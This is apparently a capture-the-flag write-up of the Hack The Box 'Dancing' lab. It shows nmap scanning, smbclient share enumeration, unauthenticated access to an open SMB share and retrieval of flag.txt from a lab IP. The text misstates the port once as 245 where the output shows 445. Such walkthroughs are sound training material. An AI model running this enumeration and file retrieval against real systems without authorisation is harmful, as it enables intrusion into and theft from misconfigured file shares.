# [Dancing](https://app.hackthebox.com/starting-point)

## Target IP - 10.129.244.243

### Enumeration

Here we are checking if we are able to establish a connection with the target machine. In Conclusion we are able to establish a connection between our lab with the target.

**Command 1** - 

`ping 10.129.244.243`

**Output** - 

```
PING 10.129.244.243 (10.129.244.243) 56(84) bytes of data.
64 bytes from 10.129.244.243: icmp_seq=1 ttl=126 time=223 ms
64 bytes from 10.129.244.243: icmp_seq=2 ttl=126 time=223 ms
64 bytes from 10.129.244.243: icmp_seq=3 ttl=126 time=227 ms
64 bytes from 10.129.244.243: icmp_seq=4 ttl=126 time=226 ms
^C
--- 10.129.244.243 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 223.375/224.862/226.739/1.491 ms
```

Here we are scanning the target machine for the open ports or services. In conclusion we find out that there is service named as microsoft-sd which is open on 245/tcp port. We can try accessing the service using smbclient.

**Command 2** -

`nmap -sV 10.129.244.243 -p 400-450`

**Output** -

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 16:07 IST
Nmap scan report for 10.129.244.243
Host is up (0.68s latency).
Not shown: 50 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.03 seconds
```

Here we tried to find out the shares present on the tagret machine and found four shares.

**Command 3** -

`smbclient -L 10.129.244.243`

**Output** - 

```
Password for [WORKGROUP\goobar07]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
```

### Foothold

Now we tried accessing the target machine with "ADMIN$" share and didn't got access.

**Command 4** - 

`smbclient \\\\10.129.244.243\\ADMIN$`

**Output** -

```
Password for [WORKGROUP\goobar07]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Now we tried accessing the target machine with "IPC$" share and didn't got access.

**Command 5** -

`smbclient \\\\10.129.244.243\\IPC$`

**Output** -

```
Password for [WORKGROUP\goobar07]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Now we tried accessing the target machine with "C$" share and didn't got access.

**Command 6** - 

`smbclient \\\\10.129.244.243\\C$`

**Output** -

```
Password for [WORKGROUP\goobar07]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Now we tried accessing the target machine with "WorkShares" share and did got access.

**Command 7** -

`smbclient \\\\10.129.244.243\\WorkShares`

**Output** - 

```
Password for [WORKGROUP\goobar07]:
Try "help" to get a list of possible commands.
smb: \>
```

Now we tried to get what command's which can be used on the smb and got a list of commands that we can use.

**Command 8** -

`help`

**Output** -

```
smb: \> help
?              allinfo        altname        archive        backup
blocksize      cancel         case_sensitive cd             chmod
chown          close          del            deltree        dir
du             echo           exit           get            getfacl
geteas         hardlink       help           history        iosize
lcd            link           lock           lowercase      ls
l              mask           md             mget           mkdir
mkfifo         more           mput           newer          notify
open           posix          posix_encrypt  posix_open     posix_mkdir
posix_rmdir    posix_unlink   posix_whoami   print          prompt
put            pwd            q              queue          quit
readlink       rd             recurse        reget          rename
reput          rm             rmdir          showacls       setea
setmode        scopy          stat           symlink        tar
tarmode        timeout        translate      unlock         volume
vuid           wdel           logon          listconnect    showconnect
tcon           tdis           tid            utimes         logoff
..             !
```

We tried to list the contents down of the current directory and found 2 more directories

**Command 9** -

`ls`

**Output** -

```
smb: \> ls
  .                                   D        0  Mon Mar 29 13:52:01 2021
  ..                                  D        0  Mon Mar 29 13:52:01 2021
  Amy.J                               D        0  Mon Mar 29 14:38:24 2021
  James.P                             D        0  Thu Jun  3 14:08:03 2021

                5114111 blocks of size 4096. 1753733 blocks available
```

Listing the contents of the first directory we get "worknotes.txt".

**Command 10** -

`ls Amy.J\`

**Output** - 

```
  .                                   D        0  Mon Mar 29 14:38:24 2021
  ..                                  D        0  Mon Mar 29 14:38:24 2021
  worknotes.txt                       A       94  Fri Mar 26 16:30:37 2021

                5114111 blocks of size 4096. 1753717 blocks available
```

Downloaded the "worknotes.txt" to our so that we can access it.

**Command 11** -

`get Amy.J\worknotes.txt`

**Output** - 

```
getting file \Amy.J\worknotes.txt of size 94 as Amy.J\worknotes.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

Listing the contents of the second directory we get "flag.txt" which contains the flag of the machine.

**Command 12** -

`ls James.P\`

**Output** - 

```
smb: \> ls James.P\
  .                                   D        0  Thu Jun  3 14:08:03 2021
  ..                                  D        0  Thu Jun  3 14:08:03 2021
  flag.txt                            A       32  Mon Mar 29 14:56:57 2021

                5114111 blocks of size 4096. 1753717 blocks available
```

Downloaded the "flag.txt" to get the access of the file.

**Command 13** -

`get James.P\flag.txt`

**Output** -

```
getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

### This machine has been pawned.

~goobar07
